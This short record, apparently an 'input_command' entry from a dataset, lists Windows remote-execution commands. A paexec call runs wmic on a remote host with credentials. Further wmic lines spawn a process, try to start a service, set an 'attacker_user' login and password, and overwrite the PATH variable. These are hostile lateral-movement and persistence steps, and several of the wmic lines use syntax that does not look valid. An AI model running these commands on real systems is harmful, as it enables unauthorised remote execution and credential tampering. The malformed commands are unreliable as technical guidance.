input_command: paexec -n 30 -u <username> -p <password> //remote_host "wmic /node:<remote_host> path win32_service get name, state"
wmic path Win32_Process call Create "cmd /c calc.exe"
wmic path Win32_Service set Name="calc", State="start"
wmic path Win32_NetworkLoginSetting set UserName="attacker_user", Password="password"
wmic path Win32_Environment Set Variable="PATH", Value="C:\\Windows\\System32;C:\\Windows"
